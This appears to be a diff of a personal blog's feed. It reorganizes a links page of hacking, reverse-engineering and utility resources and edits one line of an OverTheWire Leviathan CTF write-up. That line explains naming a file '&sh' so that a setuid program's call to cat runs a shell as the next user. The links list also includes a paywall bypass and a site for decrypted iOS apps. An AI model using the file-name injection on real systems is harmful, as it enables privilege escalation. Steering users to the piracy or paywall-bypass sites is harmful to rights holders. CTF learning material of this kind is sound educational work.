+&lt;p&gt;&lt;a href=&#34;https://dogbolt.org&#34;&gt;dogbolt.org&lt;/a&gt; - Online decompiler&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef/&lt;/a&gt; - Extremely useful all-in-one hacking web tool&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://justbeamit.com/&#34;&gt;justbeamit&lt;/a&gt; or &lt;a href=&#34;https://wetransfer.com/&#34;&gt;WeTransfer&lt;/a&gt;- P2P direct file transfer, drag n drop, no sign up&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://img.doerig.dev/&#34;&gt;img.doerig.dev&lt;/a&gt; - instant imgur upload&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://flowchart.fun/&#34;&gt;flowchart.fun&lt;/a&gt; or &lt;a href=&#34;https://draw.io&#34;&gt;draw.io&lt;/a&gt;- Easy flowchart maker&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://12ft.io/&#34;&gt;12ft.io&lt;/a&gt; - bypass article paywalls&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://shots.so/&#34;&gt;shots.so&lt;/a&gt; - make a really nice showcase image for your app&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hemingwayapp.com/&#34;&gt;hemingwayapp&lt;/a&gt; - fix grammar no signup very quick&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.onelook.com/reverse-dictionary.shtml&#34;&gt;onelook.com&lt;/a&gt; - thesaurus&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://rentry.co/&#34;&gt;rentry.co&lt;/a&gt; - better pastebin&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;software&#34;&gt;Software&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://processhacker.sourceforge.io/&#34;&gt;Process Hacker&lt;/a&gt; - The task manager that Microshaft &lt;em&gt;should have&lt;/em&gt; given you.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;resources&#34;&gt;Resources&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.tumbig.com/&#34;&gt;tumbig.com/&lt;/a&gt; - gifs and stuff&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://texturelabs.org&#34;&gt;texturelabs.org&lt;/a&gt; - free textures&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://macosicons.com/&#34;&gt;macosicons.com&lt;/a&gt; - good alternative icons for applications (cmd+i on an app and drag the icon onto the stock icon)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://armconverter.com/decryptedappstore&#34;&gt;Decrypted App Store&lt;/a&gt; - get basically any iOS IPA&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;quick-info&#34;&gt;Quick Info&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://quickref.me/&#34;&gt;quickref.me&lt;/a&gt; - cheat sheets&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://devmanual.gentoo.org/tools-reference/bash/index.html&#34;&gt;devmanual.gentoo.org/tools-reference/bash&lt;/a&gt; - bash reference guide&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://doesitarm.com/&#34;&gt;doesitarm&lt;/a&gt; - check applications for native ARM support&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://wiki.osdev.org/&#34;&gt;wiki.osdev.org&lt;/a&gt; - Wiki for low-level stuff and how operating systems work&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://c9x.me/x86/&#34;&gt;c9x.me/x86&lt;/a&gt; - x86 instruction reference&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://unprotect.it/&#34;&gt;unprotect.it&lt;/a&gt; - database of (RE/binary analysis) evasion techniques&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://superuser.com/a/1491153&#34;&gt;superuser.com/a/1491153&lt;/a&gt; - how to use angle bracket redirects&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://teachyourselfcs.com/&#34;&gt;teachyourselfcs.com/&lt;/a&gt; - roadmap for self-taught CS education&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.xyz/&#34;&gt;book.hacktricks.xyz/&lt;/a&gt; - wiki with some useful info&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://cheatsheetseries.owasp.org/index.html&#34;&gt;cheatsheetseries.owasp.org/index.html&lt;/a&gt; - OWASP Cheat Sheets&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://new.reddit.com/r/hacking/wiki/index/&#34;&gt;new.reddit.com/r/hacking/wiki/index/&lt;/a&gt; - good resources listed here&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;challenges&#34;&gt;Challenges&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&#34;http://redtiger.labs.overthewire.org/&#34;&gt;http://redtiger.labs.overthewire.org/&lt;/a&gt; - SQL Injection Lab (not listed on OTW) (possibly more unindexed labs can be found thru google)&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://justbeamit.com/&#34;&gt;https://justbeamit.com/&lt;/a&gt; - P2P direct file transfer, drag n drop, no sign up&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.tumbig.com/&#34;&gt;https://www.tumbig.com/&lt;/a&gt; - gifs and stuff&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://quickref.me/&#34;&gt;https://quickref.me/&lt;/a&gt; - cheat sheets for everything imaginable&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://devmanual.gentoo.org/tools-reference/bash/index.html&#34;&gt;https://devmanual.gentoo.org/tools-reference/bash/index.html&lt;/a&gt; - bash reference guide&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://doesitarm.com/&#34;&gt;https://doesitarm.com/&lt;/a&gt; - check applications for native ARM support&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://armconverter.com/decryptedappstore&#34;&gt;https://armconverter.com/decryptedappstore&lt;/a&gt; - get basically any iOS IPA&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://img.doerig.dev/&#34;&gt;https://img.doerig.dev/&lt;/a&gt; - instant imgur upload&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://flowchart.fun/&#34;&gt;https://flowchart.fun/&lt;/a&gt; - &lt;a href=&#34;https://github.com/tone-row/flowchart-fun&#34;&gt;https://github.com/tone-row/flowchart-fun&lt;/a&gt; - Easy typed flowchart maker (for plotting out program flow)&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://draw.io/&#34;&gt;https://draw.io/&lt;/a&gt; - Another web based flowchart maker&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://processhacker.sourceforge.io/&#34;&gt;https://processhacker.sourceforge.io/&lt;/a&gt; - The task manager that Microshaft &lt;em&gt;should have&lt;/em&gt; given you.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://wiki.osdev.org/&#34;&gt;https://wiki.osdev.org/&lt;/a&gt; - Wiki for low-level stuff and how operating systems work&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://c9x.me/x86/&#34;&gt;https://c9x.me/x86/&lt;/a&gt; - x86 Instruction set listed for reference&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://12ft.io/&#34;&gt;https://12ft.io/&lt;/a&gt; - bypass article paywalls&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;food&#34;&gt;Food&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://based.cooking/&#34;&gt;https://based.cooking/&lt;/a&gt; - simple recipe website without the web bloat&lt;/p&gt;
 - https://koolaidxk1d.github.io/posts/links/ - </description>
         </item>
     
@@ -509,7 +531,7 @@ for i in range(1, 640):
 &lt;p&gt;&lt;em&gt;But there is a catch.&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;The only way the system call will be made is if the parameter also matches a legitimate accessible file, given the conditional statement(s) at lines 23-24.&lt;/p&gt;
 &lt;p&gt;How about we name a file after the command we need to run following &amp;ldquo;/bin/cat&amp;rdquo;? We can use the special character &amp;lsquo;&amp;amp;&amp;rsquo; to run another command directly after cat.&lt;/p&gt;
-&lt;p&gt;Let&amp;rsquo;s touch the file &lt;strong&gt;&#39;&amp;amp;sh&#39;&lt;/strong&gt; and try to use it as an input to printfile. This should give us a shell running under leviathan3.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s touch the file &lt;strong&gt;&amp;rsquo;&amp;amp;sh&amp;rsquo;&lt;/strong&gt; and try to use it as an input to printfile. This should give us a shell running under leviathan3.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan2-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;There&amp;rsquo;s our password!&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;Note: There are probably many other commands you could craft to achieve the same result. This is simply the first one I managed to think up.&lt;/em&gt;&lt;/p&gt;
